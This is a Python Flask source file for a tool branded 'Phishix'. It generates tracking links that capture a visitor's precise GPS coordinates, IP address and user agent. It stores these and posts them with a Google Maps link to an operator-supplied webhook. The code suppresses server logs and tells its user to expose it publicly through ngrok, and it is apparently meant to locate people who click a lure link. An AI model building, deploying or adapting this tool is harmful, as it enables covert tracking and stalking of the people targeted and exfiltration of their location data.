from flask import Flask, render_template, request, redirect, url_for, session
import sqlite3, uuid, time, requests
import flask.cli
import subprocess
import logging, warnings

# -------------------------
# Désactiver logs et warnings
# -------------------------
log = logging.getLogger('werkzeug')
log.setLevel(logging.ERROR)
flask.cli.show_server_banner = lambda *x: None
warnings.filterwarnings("ignore")

# -------------------------
app = Flask(__name__)
app.secret_key = "f3b9c6d7a1e048b2c5f9d6e8a7b1c2d3e4f5a6b7c8d9e0f1a2b3c4d5e6f7a8b9"
DB = "geo_links.db"

# --------- Init DB ---------
def init_db():
    con = sqlite3.connect(DB)
    cur = con.cursor()
    cur.execute("""CREATE TABLE IF NOT EXISTS links (
        id TEXT PRIMARY KEY,
        webhook TEXT,
        label TEXT,
        created_at INTEGER
    )""")
    cur.execute("""CREATE TABLE IF NOT EXISTS events (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        link_id TEXT,
        ts INTEGER,
        ip TEXT,
        ua TEXT,
        lat REAL,
        lon REAL,
        acc REAL
    )""")
    con.commit()
    con.close()
init_db()

# --------- Auth ---------
USERNAME = "Phishix"
PASSWORD = "Phishix2025"

@app.route('/login', methods=['POST'])
def login():
    username = request.form.get("username")
    password = request.form.get("password")
    if username == USERNAME and password == PASSWORD:
        session["logged_in"] = True
    return redirect(url_for("admin"))

@app.route('/logout')
def logout():
    session.clear()
    return redirect(url_for("admin"))

# --------- Routes ---------
@app.route('/admin', methods=['GET','POST'])
def admin():
    link = None
    if not session.get("logged_in"):
        return render_template("admin.html", link=None)

    if request.method=='POST':
        label = request.form.get('label','')
        webhook = request.form.get('webhook')
        if webhook:
            link_id = str(uuid.uuid4())
            con=sqlite3.connect(DB)
            cur=con.cursor()
            cur.execute("INSERT INTO links(id,webhook,label,created_at) VALUES (?,?,?,?)",
                        (link_id, webhook, label, int(time.time())))
            con.commit(); con.close()
            link = url_for('go', link_id=link_id, _external=True)
    return render_template("admin.html", link=link)

@app.route('/go/<link_id>')
def go(link_id):
    return render_template("go.html", link_id=link_id)

@app.route('/location/<link_id>', methods=['POST'])
def location(link_id):
    data = request.get_json(force=True)
    lat = round(data.get('lat', 0), 7)  # 7 décimales pour précision maximale
    lon = round(data.get('lon', 0), 7)
    acc = round(data.get('acc', 2))     # précision en mètres
    ua = data.get('ua','')
    ip = request.remote_addr

    con=sqlite3.connect(DB)
    cur=con.cursor()
    cur.execute("INSERT INTO events(link_id,ts,ip,ua,lat,lon,acc) VALUES (?,?,?,?,?,?,?)",
                (link_id,int(time.time()),ip,ua,lat,lon,acc))
    con.commit()

    cur.execute("SELECT webhook,label FROM links WHERE id=?",(link_id,))
    row=cur.fetchone()
    con.close()

    if row:
        webhook,label=row
        content=f"📍 Position consentie\nLabel: {label}\nIP: {ip}\nUA: {ua}\nLat/Lon: {lat},{lon} (±{acc}m)\nMaps: https://www.google.com/maps?q={lat},{lon}"
        try:
            requests.post(webhook, json={"content": content}, timeout=8)
        except:
            pass
    return '',204

@app.route('/events')
def events():
    con=sqlite3.connect(DB)
    con.row_factory=sqlite3.Row
    cur=con.cursor()
    cur.execute("SELECT e.ts,e.ip,e.ua,e.lat,e.lon,e.acc,l.label FROM events e LEFT JOIN links l ON e.link_id=l.id ORDER BY e.ts DESC LIMIT 500")
    rows=[dict(ts_h=time.strftime('%Y-%m-%d %H:%M:%S',time.localtime(r['ts'])),
               ip=r['ip'], ua=r['ua'], lat=r['lat'], lon=r['lon'], acc=r['acc'], label=r['label'] or '') for r in cur.fetchall()]
    con.close()
    return render_template("events.html", rows=rows)

# --------- Banner coloré ---------
def print_banner():
    RED = "\033[91m"
    GREEN = "\033[92m"
    CYAN = "\033[96m"
    YELLOW = "\033[93m"
    RESET = "\033[0m"

    ascii_banner = f"""{CYAN}
██████╗ ██╗  ██╗██╗███████╗██╗  ██╗██╗██╗  ██╗
██╔══██╗██║  ██║██║██╔════╝██║  ██║██║╚██╗██╔╝
██████╔╝███████║██║███████╗███████║██║ ╚███╔╝ 
██╔═══╝ ██╔══██║██║╚════██║██╔══██║██║ ██╔██╗ 
██║     ██║  ██║██║███████║██║  ██║██║██╔╝ ██╗
╚═╝     ╚═╝  ╚═╝╚═╝╚══════╝╚═╝  ╚═╝╚═╝╚═╝  ╚═╝
                  by {YELLOW}Phishix{CYAN}
{RESET}"""
    print(ascii_banner)
    print(f"{GREEN}🚀 Flask server démarré !{RESET}")
    print(f"{CYAN}👉 Accès local   : {YELLOW}http://127.0.0.1:5000/admin{RESET}")

    # Vérifie si ngrok tourne
    try:
        result = subprocess.check_output("tasklist", shell=True).decode(errors="ignore")
        if "ngrok" in result.lower():
            print(f"{CYAN}🌍 Ngrok semble être lancé (port 5000).{RESET}")
            print(f"{CYAN}   Vérifie ton dashboard ngrok pour l’URL publique.{RESET}")
        else:
            print(f"{CYAN}ℹ️ Ngrok n'est pas détecté pour l'instant.{RESET}")
            print(f"{CYAN}⚠️ Lancer Ngrok avant de démarrer phishix.py{RESET}")
            print(f"{CYAN}⚠️ Lancer Ngrok : ngrok http 5000{RESET}")
    except:
        print(f"{CYAN}ℹ️ Impossible de vérifier ngrok.{RESET}")

    print(f"\n{GREEN}Appuie sur CTRL+C pour quitter.{RESET}\n")

# --------- Run ---------
if __name__=="__main__":
    print_banner()
    app.run(host='127.0.0.1', port=5000, debug=False, use_reloader=False)
